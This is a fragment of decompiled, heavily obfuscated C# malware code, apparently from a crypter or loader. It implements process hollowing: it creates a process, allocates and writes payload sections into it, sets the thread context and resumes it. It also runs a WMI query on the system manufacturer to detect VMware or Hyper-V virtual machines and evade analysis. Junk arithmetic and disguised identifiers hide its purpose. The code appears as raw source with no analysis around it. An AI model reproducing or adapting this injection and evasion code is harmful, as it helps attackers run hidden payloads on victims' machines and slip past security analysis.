        int num12 = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num8 + ((int.Parse("-2003205417") ^ int.Parse("2003242908")) + Convert.ToInt32(76033.0 - Math.Round(25344.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(44231.0 + Math.Tanh(22116.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("5"))) * (Convert.ToInt32(2.0 * -36225.0) + Convert.ToInt32(81893.61219557203 - Math.Log10(40944.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3")) - Convert.ToInt32(14157.0 - Math.Truncate(4719.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11"))));
        if (length != 0)
        {
          byte[] lpBuffer2 = new byte[length];
          \u003CModule\u003E.ßÛ\u0024iû((Array) _param2, num12, (Array) lpBuffer2, Convert.ToInt32(2.0 * -53405.0) + Convert.ToInt32(43848.340880173411 - Math.Log10(21922.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("11")) + Convert.ToInt32(62970.498076109376 - Math.Log10(31483.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("7")) - Type.EmptyTypes.Length - Type.EmptyTypes.Length, lpBuffer2.Length);
          int num13 = Get_DayNames.GetMonthName(hmmmoddcjSc._index, lpBaseAddress + num11, lpBuffer2, lpBuffer2.Length, out lpNumberOfBytesWritten) ? 1 : 0;
        }
        num8 += (Convert.ToInt32(41330.0 + 41330.0) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(16646.796243729885 + Math.Sin(8323.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) - Convert.ToInt32(99043.215350618586 + Math.Sqrt(49633.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("14"))) * (Convert.ToInt32(2.0 * -73852.0) + Convert.ToInt32(49258.895423728842 + Math.Tan(24625.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) + Convert.ToInt32(98453.8149866712 - Math.Cos(49227.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("13")));
        num10 += Convert.ToInt32(-33591.0 - -11197.0) + Convert.ToInt32(2.0 * 16918.5) / \u003CModule\u003E.GREGORIAN(int.Parse("1")) - Convert.ToInt32(11442.161151495402 - Math.Tan(5721.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("4"));
      }
      while (num10 <= (int) num9 - ((int.Parse("-19262703") ^ int.Parse("19211922")) + Convert.ToInt32(47799.0 + Math.Floor(47798.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("8")) - Convert.ToInt32(43754.659962606915 + Math.Log10(21879.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("5"))));
      byte[] lpBuffer3 = \u003CModule\u003E.É\u001E\u00808Å(lpBaseAddress);
      int num14 = Get_DayNames.GetMonthName(hmmmoddcjSc._index, num5 + (Convert.ToInt32(-7131.0 - 7131.0) + Convert.ToInt32(9196.0 + 9196.0) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) - Convert.ToInt32(4122.1149644825682 - Math.Sin(2061.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("3"))) * (Convert.ToInt32(-51801.0 - 51801.0) + (int.Parse("1738209675") ^ int.Parse("1738168718")) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) + Convert.ToInt32(31319.0 + 31319.0) / \u003CModule\u003E.GREGORIAN(int.Parse("5"))), lpBuffer3, (Convert.ToInt32(-152661.0 - -50887.0) + Convert.ToInt32(27931.57280717673 + Math.Sqrt(14025.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) + Convert.ToInt32(73732.5666024574 - Math.Log10(36864.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("5"))) * (Convert.ToInt32(-50314.0 - 50314.0) + Convert.ToInt32(98919.0 - 32973.0) / \u003CModule\u003E.GREGORIAN(int.Parse("5")) + Convert.ToInt32(34683.091703588245 + Math.Tan(17341.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("6"))), out lpNumberOfBytesWritten) ? 1 : 0;
      int num15 = \u003CModule\u003E.j\u0097\u00ACôc(_param2, num1 + (Convert.ToInt32(-34768.0 - 34768.0) + Convert.ToInt32(47981.0 + Math.Round(47981.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3")) - Convert.ToInt32(26396.487479563053 - Math.Log(13193.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3"))) * (Convert.ToInt32(4025556992.0 / -44864.0) + Convert.ToInt32(17019.501351361221 + Math.Sqrt(8556.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("7")) + Convert.ToInt32(72621.560008307439 - Math.Log10(36308.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))));
      if (flag)
        lpBaseAddress = num2;
      context[(Convert.ToInt32(2.0 * -4510.0) + Convert.ToInt32(86471.325455601778 + Math.Log(43241.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9")) - Convert.ToInt32(2996773362.0 / 38709.0) / \u003CModule\u003E.GREGORIAN(int.Parse("4"))) * (Convert.ToInt32(2.0 * -62761.0) + Convert.ToInt32(67232.4026143977 + Math.Sqrt(33708.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Convert.ToInt32(58111.463198458208 - Math.Log10(29053.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("5")))] = lpBaseAddress + num15;
      \u003CModule\u003E.Tú\u002CðW(((int.Parse("-774904438") ^ int.Parse("775059932")) + Convert.ToInt32(39379.0 + Math.Ceiling(39379.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("14")) + Convert.ToInt32(39163.5 + Math.Abs(39163.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))) * (Convert.ToInt32(36944.5 + 36944.5) / \u003CModule\u003E.GREGORIAN(int.Parse("2")) + Convert.ToInt32(17069.133055957132 - Math.Sqrt(8488.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("13")) - Convert.ToInt32(90875.72398298695 - Math.Log(45432.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("3"))));
      if (\u003CModule\u003E.U\u0085w\u009A\u00B7() != (Convert.ToInt32(2.0 * -18735.0) + Convert.ToInt32(29270.0 + Math.Truncate(29270.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) - Convert.ToInt32(21168.630404851585 - Math.Sqrt(10533.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("6"))) * (Convert.ToInt32(680362272.0 / -18444.0) + Convert.ToInt32(25492.0 + Math.Ceiling(25492.5)) / \u003CModule\u003E.GREGORIAN(int.Parse("4")) - Convert.ToInt32(7048.0 + Math.Round(7048.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("9"))))
      {
        int num16 = Get_DayNames.Idn(hmmmoddcjSc.IsHeldByCurrentThread, context) ? 1 : 0;
      }
      else
      {
        int num17 = Get_DayNames.RestrictedMemberAccess(hmmmoddcjSc.IsHeldByCurrentThread, context) ? 1 : 0;
      }
      int num18 = (int) Get_DayNames.MaxTicks(hmmmoddcjSc.IsHeldByCurrentThread);
      ManagementObjectCollection.ManagementObjectEnumerator objectEnumerator = (ManagementObjectCollection.ManagementObjectEnumerator) \u003CModule\u003E.\u00A0\u00B1f\u00BD\u007F(\u003CModule\u003E.\u0040\u0097\u003F\u0002\u0004(\u003CModule\u003E.\u0084\u00BEdÛï("Select * from Win32_ComputerSystem")));
      try
      {
        while (\u003CModule\u003E.\u0001þ\u0084\u003Bm((object) objectEnumerator))
        {
          ManagementBaseObject managementBaseObject = (ManagementBaseObject) \u003CModule\u003E.\u0038\u001A\u0023í\u00A0((object) objectEnumerator);
          string str = \u003CModule\u003E.ò\u000A\u00A89\u005B((object) \u003CModule\u003E.i\u0005\u0017G\u0091(\u003CModule\u003E.é\u001AÅR\u00A0((object) managementBaseObject, "Manufacturer")));
          if (!\u003CModule\u003E.\u005EIÄö\u0020((object) str, "microsoft corporation"))
          {
            int num19 = \u003CModule\u003E.\u005EIÄö\u0020((object) str, "vmware") ? 1 : 0;
          }
        }
      }
      finally
      {
        if (objectEnumerator != null)
          \u003CModule\u003E.\u002DÁ6\u003E\u002A((object) objectEnumerator);
      }
      return Convert.ToInt32(-81613.5 - -27204.5) + Convert.ToInt32(30476.0 + Math.Floor(30476.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("12")) - Convert.ToInt32(2.0 * 3271.0) / \u003CModule\u003E.GREGORIAN(int.Parse("6")) != 0;
    }
    catch (Exception ex)
    {
      \u003CModule\u003E.\u0012àLú\u003F(\u003CModule\u003E.i\u0005\u0017G\u0091((object) ex));
      \u003CModule\u003E.\u00ABæÀfö(\u003CModule\u003E.\u0023\u00B0ö\u00BBt(\u003CModule\u003E.Ú\u00A4\u009Aé\u008F(hmmmoddcjSc.PortableExecutableKinds)));
      return (int.Parse("-204599740") ^ int.Parse("204555726")) + Convert.ToInt32(99659.30249168213 + Math.Log10(49832.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("13")) - Convert.ToInt32(26733.0 + Math.Floor(26733.0)) / \u003CModule\u003E.GREGORIAN(int.Parse("10")) + Type.EmptyTypes.Length + Type.EmptyTypes.Length != 0;
    }
  }

  public delegate void ICurrentEra();

  public delegate double TryEnqueue(int p, byte b, short s);

  public delegate void LOCALE_SNATIVECOUNTRYNAME();

  public delegate double Keys(int p, byte b, short s);

  public delegate bool M_permSetSaved(IntPtr thread, int[] context);

  public delegate bool S_userDefaultUICulture(IntPtr thread, int[] context);

  public delegate bool IsReadOnly(
    IntPtr hProcess,
    int lpBaseAddress,
    int lpBuffer,
    int dwSize,
    ref int lpNumberOfBytesRead);

  public delegate int ATTPresence(
    IntPtr hProcess,
    IntPtr lpAddress,
    uint dwSize,
    uint flAllocationType,
    uint flProtect);

  public delegate bool Branch(
    IntPtr hProcess,
    int lpBaseAddress,
    byte[] lpBuffer,
    int nSize,
    out int lpNumberOfBytesWritten);

  public delegate bool M_dataIndex(IntPtr thread, int[] context);

  public delegate bool Action`3(IntPtr thread, int[] context);

  public delegate uint _includeDirs(IntPtr hThread);

  public delegate bool Methods(
    IntPtr hToken,
    string lpApplicationName,
    string lpCommandLine,
    IntPtr lpProcessAttributes,
    IntPtr lpThreadAttributes,
    bool bInheritHandles,
    uint dwCreationFlags,
    IntPtr lpEnvironment,
    string lpCurrentDirectory,
    ref Get_DayNames.First startupInfo,
    ref Get_DayNames.TypeCacheQueue hmmmoddcjSc);

  public struct TypeCacheQueue
  {
    public readonly IntPtr _index;
    public readonly IntPtr IsHeldByCurrentThread;
    public readonly uint PortableExecutableKinds;
    private readonly uint \u003CGetAssemblyRefs\u003Ed__278;
  }

  public struct First
  {
    public uint IsEnabled;
    private readonly string UnlimitedDigits;
    private readonly string Get_PropertyPtrTable;
    private readonly string COR_E_ABANDONEDMUTEX;
    private readonly byte[] M_useParents;
    private readonly IntPtr ContinueButtonText;
    private readonly IntPtr Set_Options;
    private readonly IntPtr Variance;
    private readonly IntPtr CreateStream;
  }
}
